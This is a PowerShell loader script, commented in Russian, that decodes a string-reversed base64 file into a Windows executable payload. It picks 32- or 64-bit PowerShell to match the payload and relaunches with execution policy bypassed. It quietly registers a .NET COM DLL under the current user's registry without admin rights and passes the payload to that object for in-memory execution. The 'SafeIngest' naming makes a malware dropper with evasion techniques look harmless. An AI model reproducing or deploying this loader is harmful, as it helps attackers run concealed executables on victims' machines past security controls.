﻿# 1.ps1 — COM через HKCU, автоопределение разрядности payload, .NET Framework 4.x
$ErrorActionPreference = 'Stop'

function Get-PayloadBytes {
    param([string]$Base64Path)

    if (-not (Test-Path -LiteralPath $Base64Path -PathType Leaf)) {
        throw "base64 file not found: $Base64Path"
    }

    $rev = Get-Content -Raw -LiteralPath $Base64Path
    if ([string]::IsNullOrWhiteSpace($rev)) {
        throw "base64 file is empty."
    }

    $chars = $rev.ToCharArray()
    [Array]::Reverse($chars)
    $fixed = -join $chars

    try {
        $bytes = [Convert]::FromBase64String($fixed)
    }
    catch {
        throw "Invalid Base64 content in file $Base64Path"
    }

    return [PSCustomObject]@{
        Bytes  = $bytes
        Base64 = $fixed
    }
}

function Get-PEArchitecture {
    param([byte[]]$Bytes)

    if ($Bytes.Length -lt 0x100) { return "unknown" }
    if ($Bytes[0] -ne 0x4D -or $Bytes[1] -ne 0x5A) { return "unknown" }

    $e_lfanew = [BitConverter]::ToInt32($Bytes, 0x3C)
    if ($e_lfanew -lt 0 -or ($e_lfanew + 0x18) -ge $Bytes.Length) { return "unknown" }

    if ($Bytes[$e_lfanew] -ne 0x50 -or $Bytes[$e_lfanew+1] -ne 0x45) { return "unknown" }

    $optMagicOffset = $e_lfanew + 0x18
    if (($optMagicOffset + 1) -ge $Bytes.Length) { return "unknown" }
    $magic = [BitConverter]::ToUInt16($Bytes, $optMagicOffset)

    switch ($magic) {
        0x10B { return "x86" }
        0x20B { return "x64" }
        default { return "unknown" }
    }
}

function Restart-InBitnessIfNeeded {
    param([string]$PayloadArch)

    $is64 = [Environment]::Is64BitProcess
    if ($PayloadArch -eq 'x86' -and $is64) {
        $ps32 = "$env:WINDIR\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
        if (-not (Test-Path $ps32)) { throw "32-bit PowerShell not found: $ps32" }
        & $ps32 -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath
        exit
    }
    elseif ($PayloadArch -eq 'x64' -and -not $is64) {
        $ps64 = "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
        if (-not (Test-Path $ps64)) { throw "64-bit PowerShell not found: $ps64" }
        & $ps64 -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath
        exit
    }
}

function Register-ComHKCU {
    param(
        [string]$DllPath,
        [string]$ProgId = "Company.SafeIngest",
        [string]$WorkDir
    )

    $is64 = [Environment]::Is64BitProcess
    $regAsm = if ($is64) {
        "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe"
    } else {
        "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"
    }
    if (-not (Test-Path $regAsm)) {
        throw "RegAsm not found: $regAsm"
    }

    $regOut = Join-Path $WorkDir ("SafeIngest_" + ($(if($is64){"x64"}else{"x86"})) + ".reg")
    & $regAsm $DllPath /codebase /regfile:$regOut | Out-Null
    if ($LASTEXITCODE -ne 0 -or -not (Test-Path $regOut)) {
        throw "RegAsm failed (exit $LASTEXITCODE), reg file missing: $regOut"
    }

    $userReg = Join-Path $WorkDir ([IO.Path]::GetFileNameWithoutExtension($regOut) + "_user.reg")
    (Get-Content -Raw -LiteralPath $regOut) -replace 'HKEY_CLASSES_ROOT','HKEY_CURRENT_USER\Software\Classes' |
        Set-Content -LiteralPath $userReg -Encoding ASCII

    # Используем Start-Process, чтобы не было NativeCommandError
    $proc = Start-Process -FilePath reg.exe -ArgumentList "import", "$userReg" -Wait -PassThru -WindowStyle Hidden
    if ($proc.ExitCode -ne 0) {
        throw "reg import failed (exit $($proc.ExitCode))"
    }

    $progKey = "HKCU:\Software\Classes\$ProgId"
    if (-not (Test-Path $progKey)) { throw "ProgID key not found: $progKey" }

    $clsid = (Get-ItemProperty -Path "$progKey\CLSID" -ErrorAction Stop)."(default)"
    if ([string]::IsNullOrWhiteSpace($clsid)) { throw "CLSID is empty under $progKey\CLSID" }

    return $clsid
}

# === MAIN SCRIPT ===

$scriptDir = Split-Path -Parent $PSCommandPath
Set-Location $scriptDir

$dllPath = (Resolve-Path ".\Company.SafeIngest.dll").Path
$base64Path = (Resolve-Path ".\base64.txt").Path
$work = Join-Path $env:TEMP "SafeIngestReg"
New-Item -ItemType Directory -Force -Path $work | Out-Null

$payload = Get-PayloadBytes -Base64Path $base64Path
$bytes = $payload.Bytes
$fixedBase64 = $payload.Base64
$arch = Get-PEArchitecture -Bytes $bytes

Restart-InBitnessIfNeeded -PayloadArch $arch

$clsid = Register-ComHKCU -DllPath $dllPath -WorkDir $work

try {
    $com = New-Object -ComObject Company.SafeIngest -ErrorAction Stop
    $com.RunBase64($fixedBase64)
}
catch {
    Write-Error "COM activation or call failed: $($_.Exception.Message)"
    exit 1
}
